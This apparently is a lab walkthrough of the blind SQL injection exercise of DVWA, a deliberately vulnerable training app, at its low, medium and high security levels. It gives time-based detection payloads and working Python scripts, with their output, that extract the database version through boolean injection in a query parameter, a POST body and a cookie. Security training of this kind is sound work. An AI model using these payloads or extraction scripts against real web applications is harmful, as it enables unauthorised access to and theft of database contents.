# SQL Injection (Blind)


**Security level is currently: low.**

Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.

Python code to brute force version:

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=low; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    parameters = f"id=1'+and+length(version())%3d{i}%23&Submit=Submit"
    r = requests.get(url, headers=headers, params=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        parameters = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23&Submit=Submit"
        r = requests.get(url, headers=headers, params=parameters)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

</details>


<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

</details>



**Security level is currently: medium.**

Payload to detect vulnerability: `1 and sleep(5)` it is taking 5 to response.


Python code to brute force version:


<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=medium; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
headers["Content-Type"] = "application/x-www-form-urlencoded"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    parameters = f"id=1+and+length(version())={i}&Submit=Submit"
    # parameters = {"id": f'1+and+length(version())={i}', "Submit": "Submit"}
    r = requests.post(url, headers=headers, data=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        parameters = f"id=1+and+ascii(substring(version(),{i},{j}))={s}&Submit=Submit"
        r = requests.post(url, headers=headers, data=parameters)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

</details>


<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

</details>


**Security level is currently: high.**

Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.


Python code to brute force version:


<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "id=1%27+and+length%28version%28%29%29%3E0%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    headers["Cookie"] = f"id=1'+and+length(version())%3d{i}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
    r = requests.get(url, headers=headers)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        headers["Cookie"] = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
        r = requests.get(url, headers=headers)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

</details>


<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

</details>

<br/>
